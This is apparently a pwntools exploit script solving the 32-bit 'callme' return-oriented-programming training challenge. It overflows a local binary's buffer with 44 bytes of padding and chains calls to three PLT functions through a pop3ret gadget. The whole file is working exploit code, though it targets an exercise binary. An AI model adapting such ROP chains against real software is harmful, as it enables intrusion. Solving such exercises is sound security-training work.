from pwn import *

buf = ""
buf += "A"*44
buf += p32(0x080485c0) # callme_one@plt
buf += p32(0x80488a9) # pop3ret
buf += p32(0x1) # 1
buf += p32(0x2) # 2
buf += p32(0x3) # 3
buf += p32(0x08048620) # callme_two@plt
buf += p32(0x80488a9) # pop3ret
buf += p32(0x1) # 1
buf += p32(0x2) # 2
buf += p32(0x3) # 3
buf += p32(0x080485b0) # callme_three@plt
buf += p32(0x80488a9) # pop3ret
buf += p32(0x1) # 1
buf += p32(0x2) # 2
buf += p32(0x3) # 3

b = process("./callme32")
b.recv()
b.sendline(buf)
print(b.recvall())
